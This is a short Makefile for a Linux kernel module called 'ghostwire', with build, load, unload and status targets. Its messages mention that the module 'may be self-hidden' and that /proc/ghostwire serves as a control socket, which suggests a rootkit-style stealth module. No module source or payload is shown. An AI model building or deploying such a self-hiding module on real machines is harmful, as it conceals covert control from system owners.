# ghostwire — Kernel Module Makefile
# Author: 0xNullVector
#
# Usage:
#   make              — build the .ko
#   make clean        — remove build artefacts
#   make load         — insmod (requires root)
#   make unload       — rmmod  (requires root)
#   make status       — read /proc/ghostwire

MODULE_NAME := ghostwire
KDIR        := /lib/modules/$(shell uname -r)/build
PWD         := $(shell pwd)

# Kernel build system object
obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := src/ghostwire.o

ccflags-y := -I$(PWD)/include -Wall -Wno-unused-function

# ── Targets ────────────────────────────────────────────────────

all:
	@echo "[*] Building ghostwire LKM..."
	$(MAKE) -C $(KDIR) M=$(PWD) modules
	@echo "[+] Built: $(MODULE_NAME).ko"

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	@rm -f Module.symvers modules.order

load: all
	@echo "[*] Loading module..."
	sudo insmod $(MODULE_NAME).ko
	@echo "[+] Module loaded. Control socket: /proc/ghostwire"
	@lsmod | grep $(MODULE_NAME) || echo "    (module may be self-hidden)"

unload:
	@echo "[*] Unloading module..."
	sudo rmmod $(MODULE_NAME) 2>/dev/null || \
		echo "[-] Module not found — may already be unloaded"
	@echo "[+] Done."

status:
	@cat /proc/$(MODULE_NAME) 2>/dev/null || \
		echo "[-] /proc/$(MODULE_NAME) not found — is the module loaded?"

.PHONY: all clean load unload status
